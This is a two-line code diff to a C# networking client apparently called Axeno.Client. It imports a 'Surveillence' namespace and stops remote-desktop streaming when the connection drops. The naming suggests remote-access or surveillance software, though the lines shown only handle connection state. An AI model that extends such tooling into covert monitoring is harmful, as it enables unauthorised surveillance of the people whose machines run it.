@@ -17,6 +17,7 @@ using System.IO;
 using Axeno.Client.Helper;
 using System.Timers;
 using Axeno.Client.Networking.Functions;
+using Axeno.Client.Networking.Functions.Surveillence;
 
 namespace Axeno.Client.Networking
 {
@@ -34,6 +35,7 @@ namespace Axeno.Client.Networking
         {
             if (!CheckConnection())
             {
+                RemoteDesktop.streaming = false;
                 IsConnected = false;
                 return;
             }
